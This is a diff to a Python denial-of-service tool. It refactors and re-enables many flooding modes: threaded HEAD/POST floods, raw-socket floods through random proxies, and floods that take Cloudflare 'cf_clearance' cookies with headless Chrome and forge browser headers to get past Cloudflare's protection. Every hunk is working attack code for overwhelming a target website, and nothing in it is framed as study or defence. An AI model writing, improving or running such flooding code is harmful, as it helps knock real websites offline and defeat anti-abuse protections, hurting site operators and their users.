@@ -38,6 +38,20 @@ def countdown(t):
             return
 
 #region get
+def get_target(url):
+    target = {}
+    target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+        pass
+    return target
+
 def get_proxies():
     global proxies
     if not os.path.exists("./proxy.txt"):
@@ -47,7 +61,7 @@ def get_proxies():
     return True
 
 def get_cookie(url):
-    global cookies, cookie, useragent
+    global useragent, cookieJAR, cookie
     options = webdriver.ChromeOptions()
     arguments = [
     '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
@@ -59,27 +73,19 @@ def get_cookie(url):
     driver = webdriver.Chrome(options=options)
     driver.implicitly_wait(3)
     driver.get(url)
-    loop = 0
-    while 1:
-        if(loop >= 60):
-            driver.quit()
-            return False
+    for _ in range(60):
         cookies = driver.get_cookies()
+        tryy = 0
         for i in cookies:
-            if i['name'] == "cf_clearance":
-                cookieJAR = driver.get_cookies()[0]
+            if i['name'] == 'cf_clearance':
+                cookieJAR = driver.get_cookies()[tryy]
                 useragent = driver.execute_script("return navigator.userAgent")
                 cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
-                if "cf_clearance" in cookie:
-                    pass
-                else:
-                    cookieJAR = driver.get_cookies()[1]
-                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                 driver.quit()
                 return True
             else:
+                tryy += 1
                 pass
-        loop+=1
         time.sleep(1)
     driver.quit()
 
@@ -98,12 +104,10 @@ def get_info():
 #region HEAD
 def LaunchHEAD(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackHEAD, args=(url, until))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -120,12 +124,10 @@ def AttackHEAD(url, until_datetime):
 #region POST
 def LaunchPOST(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPOST, args=(url, until))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -141,12 +143,10 @@ def AttackPOST(url, until_datetime):
 #region RAW
 def LaunchRAW(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackRAW, args=(url, until))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -162,12 +162,10 @@ def AttackRAW(url, until_datetime):
 #region PXRAW
 def LaunchPXRAW(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPXRAW, args=(url, until))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -187,84 +185,56 @@ def AttackPXRAW(url, until_datetime):
 
 #region PXSOC
 def LaunchPXSOC(url, th, t):
-    target = {}
-    target['uri'] = urlparse(url).path
-    if target['uri'] == "":
-        target['uri'] = "/"
-    target['host'] = urlparse(url).netloc
-    target['scheme'] = urlparse(url).scheme
-    if ":" in urlparse(url).netloc:
-        target['port'] = urlparse(url).netloc.split(":")[1]
-    else:
-        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
-        pass
+    target = get_target(url)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
+    req += "Host: " + target['host'] + "\r\n"
     req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
             thd.start()
-            threads_count += 1
         except:
             pass
 
 def AttackPXSOC(target, until_datetime, req):
-    proxy = random.choice(list(proxies)).split(":")
-    try:
-        if target['scheme'] == 'https':
-            s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.connect((str(target['host']), int(target['port'])))
-            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
-        else:
-            s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.connect((str(target['host']), int(target['port'])))
-    except:
-        return
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #s.connect((target['host'], int(target['port'])))
+            proxy = random.choice(list(proxies)).split(":")
+            if target['scheme'] == 'https':
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
+                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+            else:
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
             try:
                 for _ in range(100):
                     s.send(str.encode(req))
             except:
                 s.close()
         except:
-            pass
+            return
 #endregion
 
 #region SOC
 def LaunchSOC(url, th, t):
-    target = {}
-    target['uri'] = urlparse(url).path
-    if target['uri'] == "":
-        target['uri'] = "/"
-    target['host'] = urlparse(url).netloc
-    target['scheme'] = urlparse(url).scheme
-    if ":" in urlparse(url).netloc:
-        target['port'] = urlparse(url).netloc.split(":")[1]
-    else:
-        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
-        pass
+    target = get_target(url)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
     req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
     req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackSOC, args=(target, until, req))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -280,8 +250,6 @@ def AttackSOC(target, until_datetime, req):
         s.connect((str(target['host']), int(target['port'])))
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #s.connect((target['host'], int(target['port'])))
             try:
                 for _ in range(100):
                     s.send(str.encode(req))
@@ -294,13 +262,11 @@ def AttackSOC(target, until_datetime, req):
 #region CFB
 def LaunchCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
     scraper = cloudscraper.create_scraper()
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -316,48 +282,39 @@ def AttackCFB(url, until_datetime, scraper):
 #region PXCFB
 def LaunchPXCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
     scraper = cloudscraper.create_scraper()
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
             thd.start()
-            threads_count += 1
         except:
             pass
 
 def AttackPXCFB(url, until_datetime, scraper):
-    proxy = 'http://'+str(random.choice(list(proxies)))
-    proxy = {
-        'http': proxy,   
-        'https': proxy,
-    }
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
+            proxy = {
+                    'http': 'http://'+str(random.choice(list(proxies))),   
+                    'https': 'http://'+str(random.choice(list(proxies))),
+            }
             scraper.get(url, proxies=proxy)
             scraper.get(url, proxies=proxy)
         except:
             pass
-
-
-
 #endregion
 
 #region CFPRO
 def LaunchCFPRO(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
     session = requests.Session()
     scraper = cloudscraper.create_scraper(sess=session)
     jar = RequestsCookieJar()
-    for cookie in cookies:
-        jar.set(cookie['name'], cookie['value'])
-        scraper.cookies = jar
-    while threads_count <= int(th):
+    jar.set(cookieJAR['name'], cookieJAR['value'])
+    scraper.cookies = jar
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
             thd.start()
-            threads_count += 1
         except:
             pass
 
@@ -373,26 +330,15 @@ def AttackCFPRO(url, until_datetime, scraper):
 #region CFSOC
 def LaunchCFSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    target = {}
-    target['uri'] = urlparse(url).path
-    if target['uri'] == "":
-        target['uri'] = "/"
-    target['host'] = urlparse(url).netloc
-    target['scheme'] = urlparse(url).scheme
-    if ":" in urlparse(url).netloc:
-        target['port'] = urlparse(url).netloc.split(":")[1]
-    else:
-        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
-        pass
-    req =  'GET '+target['uri']+' HTTP/1.1\r\n'
+    target = get_target(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
     req += 'Host: ' + target['host'] + '\r\n'
     req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
     req += 'Accept-Encoding: gzip, deflate, br\r\n'
-    req += 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
     req += 'Cache-Control: max-age=0\r\n'
     req += 'Cookie: ' + cookie + '\r\n'
-    req += f'sec-ch-ua: "Chromium";v="99", "Google Chrome";v="99"\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
     req += 'sec-ch-ua-mobile: ?0\r\n'
     req += 'sec-ch-ua-platform: "Windows"\r\n'
     req += 'sec-fetch-dest: empty\r\n'
@@ -400,11 +346,10 @@ def LaunchCFSOC(url, th, t):
     req += 'sec-fetch-site: same-origin\r\n'
     req += 'Connection: Keep-Alive\r\n'
     req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
-    while threads_count <= int(th):
+    for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
             thd.start()
-            threads_count += 1
         except:  
             pass
 
@@ -422,11 +367,9 @@ def AttackCFSOC(until_datetime, target, req):
         try:
             for _ in range(10):
                 packet.send(str.encode(req))
-                pass
         except:
             packet.close()
             pass
-
 #endregion
 
 #region testzone
@@ -435,6 +378,7 @@ def attackSKY(url, timer, threads):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
 
 def LaunchSKY(url, timer):
+    prox = open("./socks.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(timer)
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
@@ -457,26 +401,6 @@ def LaunchSKY(url, timer):
             s.send(str.encode(req))
             try:
                 for i in range(80000):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -509,26 +433,6 @@ def LaunchSTELLAR(url, timer):
             s.send(str.encode(req))
             try:
                 for i in range(80000):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -650,18 +554,18 @@ def command():
             timer.join()
         else:
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
-#    elif command == "sky":
-#        target, thread, t = get_info()
-#        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
-#        timer = threading.Thread(target=countdown, args=(t,))
-#        timer.start()
-#        timer.join()
-#    elif command == "stellar":
-#        target, thread, t = get_info()
-#        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
-#        timer = threading.Thread(target=countdown, args=(t,))
-#        timer.start()
-#        timer.join()
+    elif command == "sky":
+        target, thread, t = get_info()
+        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "stellar":
+        target, thread, t = get_info()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
     elif command == "dnslookup":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"DOMAIN "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
         target = input()
